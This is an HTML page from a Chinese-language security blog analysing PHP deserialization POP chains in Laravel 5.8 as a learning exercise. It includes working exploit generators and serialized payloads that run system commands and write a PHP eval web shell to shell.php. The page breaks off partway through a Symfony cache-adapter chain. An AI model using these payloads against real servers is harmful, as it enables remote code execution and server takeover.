@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>Laravel 5.8框架POP链分析-下 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Laravel 5.8框架POP链分析-下</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 2, 2020&nbsp;&nbsp;11:48:38</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这是学习Laravel框架中存在的反序列化漏洞的第2篇文章。</p>
+<h3 id="0x01-POP链-4"><a href="#0x01-POP链-4" class="headerlink" title="0x01 POP链 4"></a>0x01 POP链 4</h3><p>这条链适用的Laravel最低版本是<code>5.5.39</code>，但是在<code>5.8.*</code>上依然使用。</p>
+<p><strong>入口类</strong>：<code>Illuminate\Broadcasting\PendingBroadcast</code></p>
+<p><strong>出口类</strong>：<code>Illuminate\Validation\Validator</code></p>
+<p>这一条POP链的入口方法还是<code>Illuminate\Broadcasting\PendingBroadcast</code>类的<code>__destruct()</code>方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $events;</span><br><span class="line">    <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上一篇文章中的POP链 1利用的是魔术方法<code>__call</code>，当在对象中调用一个不可访问或者不存在的方法时，该魔术方法就会被调用。</p>
+<p>在类<code>Illuminate\Validation\Validator</code>中存在<code>__call</code>函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Validation</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Validator</span> <span class="keyword">implements</span> <span class="title">ValidatorContract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $extensions = [];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $rule = Str::snake(substr($method, <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;extensions[$rule])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callExtension($rule, $parameters);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BadMethodCallException(sprintf(</span><br><span class="line">            <span class="string">'Method %s::%s does not exist.'</span>, <span class="keyword">static</span>::class, $method</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>已经知道的是，<code>__call()</code>函数中第一个参数<code>$method</code>表示的是触发该<code>__call()</code>魔术方法的函数名，那么这个值就是<code>dispatch</code>，我们令<code>$this-&gt;events</code>为类<code>Illuminate\Validation\Validator</code>的一个实例化对象。而且这里需要注意的一个点是，<code>dispatch</code>函数的名的长度是7个字符，但是这里用<code>substr($method,8);</code>从第8个位置开始从该字符串中取出字符串，所以取出的值就是一个长度为0的空字符串，也就说<code>$rule</code>其实是<code>&#39;&#39;</code>。<code>$paramter</code>是一个数组，是传入该函数的参数，它对应的就是<code>$this-&gt;event</code>，也就是传入<code>dispatch</code>的参数。</p>
+<p>跟进<code>$this-&gt;callExtension()</code>，看到了目标<code>call_user_func_array</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callExtension</span><span class="params">($rule, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $callback = <span class="keyword">$this</span>-&gt;extensions[$rule];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array($callback, $parameters);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_string($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callClassBasedExtension($callback, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>$callback</code>来自<code>$this-&gt;extension[$rule]</code>，而<code>$this-&gt;extension</code>是用户可控的一个数组。<code>$rule</code>来自<code>__call</code>魔术方法的参数<code>$method</code>，经过<code>Str::snake(substr($method, 8));</code>处理后得到。所以要执行系统命令，可以令<code>$callback</code>为<code>system</code>，然后<code>$parameter</code>为<code>whoami</code>，而<code>$parameter</code>其实就是<code>$this-&gt;event</code>。</p>
+<p>跟进<code>Str::snake</code>方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">snake</span><span class="params">($value, $delimiter = <span class="string">'_'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = $value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">static</span>::$snakeCache[$key][$delimiter])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$snakeCache[$key][$delimiter];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! ctype_lower($value)) &#123;</span><br><span class="line">        $value = preg_replace(<span class="string">'/\s+/u'</span>, <span class="string">''</span>, ucwords($value));</span><br><span class="line"></span><br><span class="line">        $value = <span class="keyword">static</span>::lower(preg_replace(<span class="string">'/(.)(?=[A-Z])/u'</span>, <span class="string">'$1'</span>.$delimiter, $value));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static</span>::$snakeCache[$key][$delimiter] = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数有点复杂，乍一看，我确实是分析不来。但是根据前面的分析，<code>$rule</code>对应的应该是<code>&#39;&#39;</code>，那么<code>$this-&gt;extensions</code>就应该是<code>array(&#39;&#39; =&gt; &#39;system&#39;);</code>，得出exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">event</span>;</span><br><span class="line">        <span class="keyword">protected</span> $events;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Validation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Validator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">extensions</span> = [];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($extenstions)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;extensions = $extensions;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $a = new Illuminate\Validation\Validator(array('' =&gt; 'system'));</span><br><span class="line">    $b = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($a, <span class="string">'whoami'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> serialize($b);</span><br><span class="line">    <span class="comment">// echo urlencode(serialize($b));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>给保护字段添加<code>%00</code>得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">40</span>:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"%00*%00event"</span>;s:<span class="number">6</span>:<span class="string">"whoami"</span>;s:<span class="number">9</span>:<span class="string">"%00*%00events"</span>;O:<span class="number">31</span>:<span class="string">"Illuminate\Validation\Validator"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"extensions"</span>;a:<span class="number">1</span>:&#123;s:<span class="number">0</span>:<span class="string">""</span>;s:<span class="number">6</span>:<span class="string">"system"</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/2.png" alt="2"></p>
+<p>调试跟踪下，确实证实了猜想，<code>$rule</code>是<code>&#39;&#39;</code>。</p>
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/1.png" alt="1"></p>
+<h4 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h4><p>这里写shell和第一篇文章中的<strong>POP链 1</strong>一样，需要借助类<code>PhpOption\LazyOption</code>写入shell。</p>
+<p>poc：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">event</span>;</span><br><span class="line">        <span class="keyword">protected</span> $events;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Validation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Validator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">extensions</span> = [];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($extensions)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;extensions = $extensions;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpOption</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">LazyOption</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line">        <span class="keyword">private</span> $arguments;</span><br><span class="line">        <span class="keyword">private</span> $option;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback, $arguments, $option)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;arguments = $arguments;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;option = $option;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $lazyOption = new PhpOption\LazyOption('file_put_contents', array('/var/www/html/shell.php', '&lt;?php eval($_POST[1]);'), null);</span><br><span class="line">    $validator = <span class="keyword">new</span> Illuminate\Validation\Validator(<span class="keyword">array</span>(<span class="string">''</span> =&gt; <span class="keyword">array</span>($lazyOption, <span class="string">'filter'</span>)));</span><br><span class="line">    $pendingBroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($validator, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingBroadcast));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A40%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBroadcasting%<span class="number">5</span>CPendingBroadcast%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>event%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>events%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A31%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CValidation%<span class="number">5</span>CValidator%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>extensions%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>PhpOption%<span class="number">5</span>CLazyOption%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A30%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>PhpOption%<span class="number">5</span>CLazyOption%<span class="number">00</span>callback%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>file_put_contents%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A31%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>PhpOption%<span class="number">5</span>CLazyOption%<span class="number">00</span>arguments%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fvar%<span class="number">2</span>Fwww%<span class="number">2</span>Fhtml%<span class="number">2</span>Fshell.php%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A28%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>PhpOption%<span class="number">5</span>CLazyOption%<span class="number">00</span>option%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>filter%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-POP链-5"><a href="#0x02-POP链-5" class="headerlink" title="0x02 POP链 5"></a>0x02 POP链 5</h3><p><strong>入口类</strong>：<code>Symfony\Component\Cache\Adapter\TagAwareAdapter</code></p>
+<p><strong>出口类</strong>：<code>Symfony\Component\Cache\Adapter\ProxyAdapter</code></p>
+<p>这条POP链是由Laravel的Symfony组件的<code>TagAwareAdapter</code>类触发的。我们初始安装的Laravel 5.8.*框架并不包含该组件。修改<code>composer.json</code>文件，在<code>require</code>下添加：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"symfony/symfony": "4.*"</span><br></pre></td></tr></table></figure>
+
+<p>然后执行更新：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure>
+
+<p>POP链的入口在<code>TagAwareAdapter</code>类的<code>__destruct</code>方法，该方法会调用<code>commit()</code>：</p>
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/3.png" alt="3"></p>
+<p><code>commit()</code>方法会调用<code>invalidateTags()</code>，继续跟进：</p>
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/4.png" alt="4"></p>
+<p>在第124行，用一个<code>foreach</code>循环对<code>$items</code>进行遍历，而<code>$items</code>来自<code>$this-&gt;deferred</code>，所以得到第一个信息：<strong><code>$this-&gt;deferred</code>是一个数组</strong>，而<code>$this-&gt;deferred</code>是用户可控的。然后进入if语句，调用<code>$this-&gt;pool</code>的<code>saveDeferred()</code>方法，可以得到，<code>$this-&gt;pool</code>是一个对象，而且<code>$this-&gt;pool</code>也是用户可控的。当前类中并不存在<code>saveDeferred()</code>方法，所以这里肯定是通过<code>$this-&gt;pool</code>调用别的对象里的<code>saveDeferred()</code>方法，注意传入的值为<code>$item</code>。</p>
+<p>全局搜索下，在<code>Symfony\Component\Cache\Adapter\ProxyAdapter</code>类中发现了可用的方法：</p>
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/5.png" alt="5"></p>
+<p>在该类的<code>saveDeferred()</code>方法中，会将之前传入的<code>$item</code>参数继续传入<code>doSave()</code>方法中，跟入<code>doSave</code>：</p>
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/6.png" alt="6"></p>
+<p>在<code>doSave()</code>中发现了动态调用（第245行）。那先来分析一下是否可以利用，首先<code>$this-&gt;setInnerItem</code>是<code>ProxyAdapter</code>类的private属性成员变量，是用户可控的；而且经过前面的分析，知道<code>$item</code>是来自<code>ProxyAdapter</code>类的<code>$this-&gt;deferred</code>属性，也是可控的；还有一个就是<code>$innerItem</code>，从第234行可以看到，当满足if条件语句<code>if ($item[&quot;\0*\0poolHash&quot;] === $this-&gt;poolHash &amp;&amp; $item[&quot;\0*\0innerItem&quot;])</code>时，<code>$innerItem</code>就可以由<code>$item[&quot;\0*\0innerItem&quot;]</code>得到。</p>
+<p>这里数组key值中的<code>\0*\0</code>是对象强转数组得到的，表示<strong>protected</strong>成员变量，下面就是一个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $bookname;</span><br><span class="line">    <span class="keyword">protected</span> $price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bookname, $price)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bookname = $bookname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;price = $price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$book = <span class="keyword">new</span> Book(<span class="string">'book-1'</span>, <span class="number">14</span>);</span><br><span class="line">var_dump((<span class="keyword">array</span>)$book);</span><br></pre></td></tr></table></figure>
+
+<p>ps：注意区分<code>(array)$book</code>和<code>array($book)</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line">  <span class="string">'\0*\0bookname'</span> =&gt; string <span class="string">'book-1'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'\0*\0price'</span> =&gt; int <span class="number">14</span></span><br></pre></td></tr></table></figure>
+
+<p>接着回到<code>doSave()</code>方法。上面的分析其实还可以得到一个很重要的信息，那就是<code>$item</code>其实是一个对象。在226行，判断<code>$item</code>是不是<code>CacheItem</code>的一个实例化对象：</p>
